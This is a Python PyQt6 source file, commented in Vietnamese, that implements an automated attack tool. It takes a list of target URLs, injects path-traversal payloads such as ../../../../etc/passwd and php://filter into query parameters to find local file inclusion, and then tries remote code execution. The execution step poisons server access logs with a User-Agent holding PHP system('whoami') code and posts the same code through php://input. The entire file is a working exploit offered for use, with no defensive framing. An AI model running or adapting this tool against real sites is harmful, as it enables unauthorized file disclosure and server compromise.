import requests
import base64
import re
from urllib.parse import urlparse, parse_qs
from PyQt6.QtCore import QThread, pyqtSignal

class LFIThread(QThread):
    ket_qua_scan = pyqtSignal(str, str, str) 
    log_process = pyqtSignal(str)            
    hoan_thanh = pyqtSignal()

    def __init__(self, list_urls):
        super().__init__()
        self.targets = list_urls
        self.is_running = True
        
        # --- PHASE 1: LFI PAYLOAD ---
        self.payloads_file = [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "/etc/passwd",
            "./index.php", 
            "index.php",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        
        # --- PHASE 2: LOG FILES ---
        self.log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "../../../../xampp/apache/logs/access.log",
            "../../../../var/log/apache2/access.log"
        ]
        
        # --- SIGNATURES ---
        self.signatures = [
            b"root:x:0:0", b"[extensions]", b"[fonts]", b"<?php", b"<html>", b"JFIF", b"PNG"
        ]

        # Mã độc chung cho RCE
        self.rce_code = "<?php HACKED!! echo 'da RCE thanh cong'; system('whoami'); ?>"

    def run(self):
        self.log_process.emit(f"🔥 Bắt đầu tấn công {len(self.targets)} mục tiêu...")
        
        for url in self.targets:
            if not self.is_running: break
            
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = parse_qs(parsed.query)
            print(params) 
            if not params: continue

            found_lfi_param = None 

            # ==========================================================
            # GIAI ĐOẠN 1: QUÉT TÌM LỖI ĐỌC FILE
            # ==========================================================
            for param_name in params:
                for payload in self.payloads_file:
                    if not self.is_running: break
                    # Nối chuỗi thủ công
                    new_query_parts = []
                    for k, v in params.items():
                        if k == param_name: new_query_parts.append(f"{k}={payload}")
                        else: 
                            for val in v: new_query_parts.append(f"{k}={val}")
                    
                    attack_url = f"{base_url}?{'&'.join(new_query_parts)}"
                    
                    try:
                        res = requests.get(attack_url, timeout=5)
                        content = res.content
                        
                        # In log preview
                        preview = content[:50].replace(b'\n', b' ').decode('utf-8', errors='ignore')
                        self.log_process.emit(f"Check LFI: ...{attack_url[-40:]} | Len: {len(content)}")

                        is_vuln = False
                        
                        # Check Signature
                        for sig in self.signatures:
                            if sig in content:
                                is_vuln = True
                                break
                        
                        # Check Base64
                        if not is_vuln:
                            try:
                                possible_b64s = re.findall(b'[a-zA-Z0-9+/=]{20,}', content)
                                for b64_str in possible_b64s:
                                    decoded = base64.b64decode(b64_str)
                                    if b"<?php" in decoded or b"root:" in decoded:
                                        is_vuln = True
                                        break
                            except: pass

                        if is_vuln:
                            self.ket_qua_scan.emit(url, payload, "CÓ LỖI (FILE READ)")
                            self.log_process.emit(f"<b style='color:orange'>[+] Đọc được file: {payload}</b>")
                            found_lfi_param = param_name 
                            break 
                            
                    except Exception: pass
                
                if found_lfi_param: break 

            # ==========================================================
            # GIAI ĐOẠN 2 & 3: RCE EXPLOITATION (NẾU CÓ LFI)
            # ==========================================================
            if found_lfi_param:
                self.log_process.emit(f"<b style='color:red'>☠️ PHÁT HIỆN LỖI! ĐANG THỬ RCE...</b>")
                
                # --- PHASE 2: LOG POISONING (GET Request) ---
                self.log_process.emit(">> Thử Log Poisoning...")
                try:
                    # Bơm thuốc
                    headers = {'User-Agent': self.rce_code}
                    requests.get(url, headers=headers, timeout=5)
                    
                    # Kích nổ
                    for log_path in self.log_paths:
                        new_query_parts = []
                        for k, v in params.items():
                            if k == found_lfi_param: new_query_parts.append(f"{k}={log_path}")
                            else: 
                                for val in v: new_query_parts.append(f"{k}={val}")
                        exploit_url = f"{base_url}?{'&'.join(new_query_parts)}"
                        
                        res = requests.get(exploit_url, timeout=5)
                        if b"HACKED" in res.content:
                            self.ket_qua_scan.emit(url, "Log Poisoning", "RCE THÀNH CÔNG")
                            self.log_process.emit(f"<h2 style='color:red; background:yellow'>💥 RCE VIA LOG POISONING!</h2>")
                            break
                except: pass

                # --- PHASE 3: PHP INPUT (POST Request) - MỚI THÊM ---
                self.log_process.emit(">> Thử php://input (Wrapper)...")
                try:
                    # 1. Tạo URL với tham số trỏ tới php://input
                    new_query_parts = []
                    for k, v in params.items():
                        if k == found_lfi_param: new_query_parts.append(f"{k}=php://input")
                        else: 
                            for val in v: new_query_parts.append(f"{k}={val}")
                    
                    input_url = f"{base_url}?{'&'.join(new_query_parts)}"
                    
                    # 2. Gửi POST request với code PHP nằm trong BODY (data)
                    # Đây là chìa khóa để php://input hoạt động
                    res = requests.post(input_url, data=self.rce_code, timeout=5)
                    
                    if b"HACKED" in res.content:
                        self.ket_qua_scan.emit(url, "php://input", "RCE THÀNH CÔNG")
                        self.log_process.emit(f"<h2 style='color:red; background:yellow'> RCE VIA PHP://INPUT!</h2>")
                        try:
                            output = res.text.split("HACKED")[1][:50]
                            self.log_process.emit(f"<b>Output lệnh: {output}</b>")
                        except: pass
                    else:
                        self.log_process.emit("-> php://input thất bại ")
                except Exception as e: 
                    pass

        self.log_process.emit("🏁 Đã hoàn tất tấn công!")
        self.hoan_thanh.emit()